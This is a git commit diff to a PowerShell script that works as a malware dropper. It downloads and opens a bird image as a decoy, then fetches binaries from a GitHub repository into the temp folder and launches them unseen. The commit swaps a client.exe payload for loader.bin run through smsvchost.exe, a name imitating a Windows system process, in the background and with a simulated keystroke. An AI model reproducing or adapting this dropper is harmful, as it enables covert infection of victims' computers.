1a1ea22f472eb0cde3755bcced2764361ada5013
test <test>
2025-03-05 07:14:40 -0800

    f

--- script-ps.ps1
+++ script-ps.ps1
@@ -1,28 +1,32 @@
-try { 
+try {
     # Download the image
     Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
     
     # Open the downloaded image
     Start-Process "$env:TEMP\blue-bird.jpg"
 
-    # Download the client.exe file
-    $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
-    $exePath = "$env:TEMP\client.exe"
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-    
-    # Run the downloaded client.exe
-    Start-Process $exePath -ErrorAction Stop
-    
-    # Write-Host "client.exe launched successfully."
-    
-    # Show success message box
-    # Add-Type -AssemblyName PresentationFramework
-    # [System.Windows.MessageBox]::Show("Script executed successfully!", "Success", "OK", "Information")
-} 
+    # Download loader.bin
+    $loaderUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/loader.bin"
+    $loaderPath = "$env:TEMP\loader.bin"
+    Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath
+
+    # Download smsvchost.exe
+    $smsvchostUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/smsvchost.exe"
+    $smsvchostPath = "$env:TEMP\smsvchost.exe"
+    Invoke-WebRequest -Uri $smsvchostUrl -OutFile $smsvchostPath
+
+    # Run smsvchost.exe with loader.bin as an argument in the background
+    $process = Start-Process -FilePath $smsvchostPath -ArgumentList $loaderPath -NoNewWindow -PassThru
+
+    # Wait for 1 second
+    Start-Sleep -Seconds 1
+
+    # Send the Enter key to the process
+    $wshell = New-Object -ComObject WScript.Shell
+    $wshell.SendKeys("~")  # "~" is the symbol for the Enter key
+
+    # Write-Host "Process executed successfully in the background."
+}
 catch {
     # Write-Host "An error occurred: $_"
-    
-    # Show error message box
-    # Add-Type -AssemblyName PresentationFramework
-    # [System.Windows.MessageBox]::Show("An error occurred: $_", "Error", "OK", "Error")
 }
